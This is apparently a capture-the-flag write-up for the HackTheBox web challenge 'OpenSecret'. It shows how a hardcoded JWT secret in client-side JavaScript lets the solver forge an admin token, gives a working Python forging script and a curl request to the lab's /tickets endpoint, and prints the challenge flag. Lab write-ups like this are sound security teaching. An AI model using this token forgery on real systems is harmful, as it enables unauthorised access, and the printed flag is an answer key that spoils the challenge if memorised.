---
title: "OpenSecret"
ctf: "HackTheBox"
date: 2026-05-22
category: web
difficulty: easy
flag_format: "HTB{...}"
---

# OpenSecret

## Summary

A hardcoded JWT signing secret exposed in client-side JavaScript allowed forging an admin session, which revealed a support ticket containing the flag.

## Solution

### Step 1: Recover JWT Secret

The main page's inline script contained a hardcoded SECRET_KEY:

```javascript
const SECRET_KEY = "HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}";
```

### Step 2: Forge Admin JWT

Used the secret to sign a JWT with `{"username": "admin"}` and HS256.

```python
import base64, json, hmac, hashlib

secret = "HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}"
header = json.dumps({"alg": "HS256", "typ": "JWT"})
payload = json.dumps({"username": "admin"})

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

data = b64url(header.encode()) + "." + b64url(payload.encode())
sig = hmac.new(secret.encode(), data.encode(), hashlib.sha256).digest()
token = data + "." + b64url(sig)

print(token)
```

### Step 3: Read Protected Tickets

Sent a request to `/tickets` with the forged admin JWT cookie:

```bash
curl -s "http://154.57.164.81:31239/tickets" \
  -H "Cookie: session_token=<admin-jwt>"
```

Ticket #3 from "System Admin" contained the master access key / flag.

## Flag

```
HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}
```
